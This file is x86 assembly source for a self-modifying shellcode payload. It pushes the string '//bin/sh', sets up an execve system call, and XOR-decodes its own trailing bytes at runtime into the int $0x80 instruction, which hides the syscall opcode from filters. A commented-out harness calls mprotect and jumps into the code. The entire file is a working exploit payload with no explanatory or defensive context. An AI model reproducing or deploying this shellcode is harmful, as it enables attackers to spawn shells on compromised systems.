.globl main
.type main, @function

main:
	/*lea shellcode, %edx;
	and $0xfffff000, %edx;
	push $0x7;
	push $0x1000;
	push %edx;
	call mprotect;
	xor %ecx, %ecx;
	lea shellcode, %edx;
	push %edx;
	call *(%esp);

shellcode:*/
	// edi == 0xffffffff
	push %ecx;
	pop %edi;
	dec %edi;
	// int $0x80 offset
	push $0x30;
	pop %esi;
	xor %edi, 0x0(%edx, %esi, 1);
	push $0x31;
	pop %esi;
	push $0x5e;
	pop %edi;
	xor %edi, 0x0(%edx, %esi, 1);
	push %ecx; 
	pop %edx;
	push %edx
	push $0x68732f6e;
	push $0x69622f2f;
	push %esp;
	pop %ebx;
	inc %ecx;
	inc %ecx;
	inc %ecx;
	inc %ecx;
	inc %ecx;
	inc %ecx;
	inc %ecx;
	inc %ecx;
	inc %ecx;
	inc %ecx;
	inc %ecx;
	push %ecx;
	pop %eax;
	push %edx;
	pop %ecx;
	.byte 0x32, 0x21;
